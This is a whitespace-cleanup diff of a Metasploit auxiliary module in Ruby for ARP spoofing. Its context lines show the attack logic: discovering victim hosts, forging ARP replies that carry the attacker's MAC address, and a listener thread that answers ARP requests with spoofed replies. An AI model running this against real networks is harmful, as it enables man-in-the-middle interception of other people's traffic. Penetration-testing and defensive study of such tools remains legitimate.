@@ -61,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		open_pcap({'SNAPLEN' => 68, 'FILTER' => "arp[6:2] == 0x0002"})
 		@netifaces = true
-		if not netifaces_implemented? 
+		if not netifaces_implemented?
 			print_error("WARNING : Pcaprub is not uptodate, some functionality will not be available")
 			@netifaces = false
 		end
@@ -81,7 +81,7 @@ class Metasploit3 < Msf::Auxiliary
 			@interface = datastore['INTERFACE'] || Pcap.lookupdev
 			#This is needed on windows cause we send interface directly to Pcap functions
 			@interface = get_interface_guid(@interface)
-			@smac = datastore['SMAC'] 
+			@smac = datastore['SMAC']
 			@smac ||= get_mac(@interface) if @netifaces
 			raise RuntimeError ,'Source Mac should be defined' unless @smac
 			raise RuntimeError ,'Source Mac is not in correct format' unless is_mac?(@smac)
@@ -118,10 +118,10 @@ class Metasploit3 < Msf::Auxiliary
 				print_status("RE-ARPing the victims...")
 				3.times do 					
 					@dsthosts_cache.keys.sort.each do |dhost|
-						dmac = @dsthosts_cache[dhost] 
+						dmac = @dsthosts_cache[dhost]
 						if datastore['BIDIRECTIONAL']
 							@srchosts_cache.keys.sort.each do |shost|
-								smac = @srchosts_cache[shost] 
+								smac = @srchosts_cache[shost]
 								if shost != dhost
 									print_status("Sending arp packet for #{shost} to #{dhost}") if datastore['VERBOSE']
 									reply = buildreply(shost, smac, dhost, dmac)
@@ -144,7 +144,7 @@ class Metasploit3 < Msf::Auxiliary
 						@srchosts_cache.keys.sort.each do |shost|
 							smac = @srchosts_cache[shost]
 							@dsthosts_cache.keys.sort.each do |dhost|
-								dmac = @dsthosts_cache[dhost] 
+								dmac = @dsthosts_cache[dhost]
 								if shost != dhost
 									print_status("Sending arp packet for #{dhost} to #{shost}") if datastore['VERBOSE']
 									reply = buildreply(dhost, dmac, shost, smac)
@@ -155,7 +155,7 @@ class Metasploit3 < Msf::Auxiliary
 						end
 					end
 				end # 3.times
-			end 
+			end
 			close_pcap
 		end #begin/rescue/ensure
 	end
@@ -178,7 +178,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		dhosts_range = Rex::Socket::RangeWalker.new(datastore['DHOSTS'])
 		@dhosts = []
-		dhosts_range.each{|dhost| if is_ipv4? dhost and dhost != @sip then @dhosts.push(dhost) end} 
+		dhosts_range.each{|dhost| if is_ipv4? dhost and dhost != @sip then @dhosts.push(dhost) end}
 
 		#Build the local dest hosts cache
 		print_status("Building the destination hosts cache...")
@@ -192,7 +192,7 @@ class Metasploit3 < Msf::Auxiliary
 				next if not reply.is_arp?
 				#Without this check any arp request would be added to the cache
 				if @dhosts.include? reply.arp_saddr_ip
-					print_status("#{reply.arp_saddr_ip} appears to be up.") 
+					print_status("#{reply.arp_saddr_ip} appears to be up.")
 					report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)
 					@dsthosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac
 				end
@@ -205,7 +205,7 @@ class Metasploit3 < Msf::Auxiliary
 			while(reply = getreply())
 				next if not reply.is_arp?
 				if @dhosts.include? reply.arp_saddr_ip
-					print_status("#{reply.arp_saddr_ip} appears to be up.") 
+					print_status("#{reply.arp_saddr_ip} appears to be up.")
 					report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)
 					@dsthosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac
 				end
@@ -233,7 +233,7 @@ class Metasploit3 < Msf::Auxiliary
 				while(reply = getreply())
 					next if not reply.is_arp?
 					if @shosts.include? reply.arp_saddr_ip
-						print_status("#{reply.arp_saddr_ip} appears to be up.") 
+						print_status("#{reply.arp_saddr_ip} appears to be up.")
 						report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)
 						@srchosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac
 					end
@@ -246,7 +246,7 @@ class Metasploit3 < Msf::Auxiliary
 				while(reply = getreply())
 					next if not reply.is_arp?
 					if @shosts.include? reply.arp_saddr_ip
-						print_status("#{reply.arp_saddr_ip} appears to be up.") 
+						print_status("#{reply.arp_saddr_ip} appears to be up.")
 						report_host(:host => reply.arp_saddr_ip, :mac=>reply.arp_saddr_mac)
 						@srchosts_cache[reply.arp_saddr_ip] = reply.arp_saddr_mac
 					end
@@ -283,10 +283,10 @@ class Metasploit3 < Msf::Auxiliary
 				@mutex_cache.unlock
 			end
 			@dsthosts_cache.keys.sort.each do |dhost|
-				dmac = @dsthosts_cache[dhost] 
+				dmac = @dsthosts_cache[dhost]
 				if datastore['BIDIRECTIONAL']
 					@srchosts_cache.keys.sort.each do |shost|
-						smac = @srchosts_cache[shost] 
+						smac = @srchosts_cache[shost]
 						if shost != dhost
 							print_status("Sending arp packet for #{shost} to #{dhost}") if datastore['VERBOSE']
 							reply = buildreply(shost, @smac, dhost, dmac)
@@ -310,7 +310,7 @@ class Metasploit3 < Msf::Auxiliary
 				@srchosts_cache.keys.sort.each do |shost|
 					smac = @srchosts_cache[shost]
 					@dsthosts_cache.keys.sort.each do |dhost|
-						dmac = @dsthosts_cache[dhost] 
+						dmac = @dsthosts_cache[dhost]
 						if shost != dhost
 							print_status("Sending arp packet for #{dhost} to #{shost}") if datastore['VERBOSE']
 							reply = buildreply(dhost, @smac, shost, smac)
@@ -379,7 +379,7 @@ class Metasploit3 < Msf::Auxiliary
 		args[:localip] = @sip.dup
 		@listener = Thread.new(args) do |args|
 			begin
-				#one more local copy 
+				#one more local copy
 				liste_src_ips = []
 				if args[:BIDIRECTIONAL]
 					args[:shosts].each_key {|address| liste_src_ips.push address}
@@ -400,22 +400,22 @@ class Metasploit3 < Msf::Auxiliary
 							if pkt.arp_opcode == 1
 								#check if the source ip is in the dest hosts
 								if (liste_dst_ips.include? pkt.arp_saddr_ip and liste_src_ips.include? pkt.arp_daddr_ip) or
-								   (args[:BIDIRECTIONAL] and liste_dst_ips.include? pkt.arp_daddr_ip and liste_src_ips.include? pkt.arp_saddr_ip)
+									(args[:BIDIRECTIONAL] and liste_dst_ips.include? pkt.arp_daddr_ip and liste_src_ips.include? pkt.arp_saddr_ip)
 									print_status("Listener : Request from #{pkt.arp_saddr_ip} for #{pkt.arp_daddr_ip}") if datastore['VERBOSE']
 									reply = buildreply(pkt.arp_daddr_ip, @smac, pkt.arp_saddr_ip, pkt.eth_saddr)
 									3.times{listener_capture.inject(reply.to_s)}
 								elsif args[:AUTO_ADD]
-									if (@dhosts.include? pkt.arp_saddr_ip and not liste_dst_ips.include? pkt.arp_saddr_ip and 
-									    pkt.arp_saddr_ip != localip)
+									if (@dhosts.include? pkt.arp_saddr_ip and not liste_dst_ips.include? pkt.arp_saddr_ip and
+										pkt.arp_saddr_ip != localip)
 										@mutex_cache.lock
-										print_status("#{pkt.arp_saddr_ip} appears to be up.") 
-										@dsthosts_autoadd_cache[pkt.arp_saddr_ip] = pkt.arp_saddr_mac 
+										print_status("#{pkt.arp_saddr_ip} appears to be up.")
+										@dsthosts_autoadd_cache[pkt.arp_saddr_ip] = pkt.arp_saddr_mac
 										liste_dst_ips.push pkt.arp_saddr_ip
 										@mutex_cache.unlock
-									elsif (args[:BIDIRECTIONAL] and @shosts.include? pkt.arp_saddr_ip and 
+									elsif (args[:BIDIRECTIONAL] and @shosts.include? pkt.arp_saddr_ip and
 										not liste_src_ips.include? pkt.arp_saddr_ip and pkt.arp_saddr_ip != localip)
 										@mutex_cache.lock
-										print_status("#{pkt.arp_saddr_ip} appears to be up.") 
+										print_status("#{pkt.arp_saddr_ip} appears to be up.")
 										@srchosts_autoadd_cache[pkt.arp_saddr_ip] = pkt.arp_saddr_mac
 										liste_src_ips.push pkt.arp_saddr_ip
 										@mutex_cache.unlock
